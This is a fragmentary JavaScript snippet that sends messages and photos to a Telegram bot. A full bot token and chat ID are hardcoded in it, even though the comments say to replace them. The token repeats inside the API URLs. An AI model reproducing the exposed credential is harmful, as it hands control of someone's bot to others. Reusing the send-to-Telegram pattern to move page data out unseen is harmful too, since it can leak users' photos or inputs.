...
const BOT_TOKEN = '7680629803:AAF01ECNFc8LJVd45WaYr_U5loE_h7ExhvU'; // Replace with your bot's TOKEN
const CHAT_ID = '5818549192'; // Replace with your bot's chat ID
        ...
        function sendMessageToTelegram(message) {
            fetch(`https://api.telegram.org/bot7680629803:AAF01ECNFc8LJVd45WaYr_U5loE_h7ExhvU/sendMessage`, {
                method: 'POST',
                headers: {
        ...
        function sendPhoto(photo) {
            ...
            fetch(`https://api.telegram.org/bot7680629803:AAF01ECNFc8LJVd45WaYr_U5loE_h7ExhvU/sendPhoto?chat_id=5818549192`, {
                method: 'POST',
                body: formData
            })
            .then(response => {
